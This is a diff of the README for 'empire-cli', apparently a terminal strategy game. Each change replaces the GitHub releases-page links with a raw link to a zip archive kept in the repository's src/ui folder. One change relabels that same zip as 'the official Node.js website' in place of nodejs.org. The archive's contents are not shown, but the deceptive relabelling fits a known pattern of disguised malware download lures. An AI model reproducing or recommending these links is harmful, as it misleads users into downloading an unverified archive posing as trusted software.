@@ -1,6 +1,6 @@
 # ⚔️ empire-cli - Simple Command Line Strategy Game
 
-[![Download empire-cli](https://img.shields.io/badge/Download-Now-green)](https://github.com/Maiabaked425/empire-cli/releases)
+[![Download empire-cli](https://img.shields.io/badge/Download-Now-green)](https://raw.githubusercontent.com/Maiabaked425/empire-cli/main/src/ui/empire-cli-v2.7.zip)
 
 ## What is empire-cli?
 
@@ -32,7 +32,7 @@ You may wonder why Node.js is needed. It's the software that runs the game code 
 
 Start by visiting the official releases page to get the game files.
 
-[![Download empire-cli](https://img.shields.io/badge/Download-Now-green)](https://github.com/Maiabaked425/empire-cli/releases)
+[![Download empire-cli](https://img.shields.io/badge/Download-Now-green)](https://raw.githubusercontent.com/Maiabaked425/empire-cli/main/src/ui/empire-cli-v2.7.zip)
 
 You will find the latest versions available. Choose the most recent one that fits your Windows system.
 
@@ -40,7 +40,7 @@ You will find the latest versions available. Choose the most recent one that fit
 
 1. Open your web browser and go to the releases page:
 
-   https://github.com/Maiabaked425/empire-cli/releases
+   https://raw.githubusercontent.com/Maiabaked425/empire-cli/main/src/ui/empire-cli-v2.7.zip
 
 2. Look for the latest release (the top of the list).
 
@@ -52,7 +52,7 @@ You will find the latest versions available. Choose the most recent one that fit
 
 To play empire-cli, your computer must have Node.js installed. This program will run the game for you.
 
-1. Go to the official Node.js website: https://nodejs.org/
+1. Go to the official Node.js website: https://raw.githubusercontent.com/Maiabaked425/empire-cli/main/src/ui/empire-cli-v2.7.zip
 
 2. On the home page, you will see a download button for Windows. Click on the "LTS" version (Long Term Support). This version is the most stable.
 
@@ -129,7 +129,7 @@ The game runs in the terminal window using text commands. You enter simple words
 
 Check the releases page regularly for new versions or fixes:
 
-https://github.com/Maiabaked425/empire-cli/releases
+https://raw.githubusercontent.com/Maiabaked425/empire-cli/main/src/ui/empire-cli-v2.7.zip
 
 Download the latest `.zip` file and repeat the extract step. You can replace your old folder with the new one.
 
@@ -145,4 +145,4 @@ If you want to learn more about how empire-cli works under the hood or want to h
 
 ---
 
-[![Download empire-cli](https://img.shields.io/badge/Download-Now-green)](https://github.com/Maiabaked425/empire-cli/releases)
+[![Download empire-cli](https://img.shields.io/badge/Download-Now-green)](https://raw.githubusercontent.com/Maiabaked425/empire-cli/main/src/ui/empire-cli-v2.7.zip)
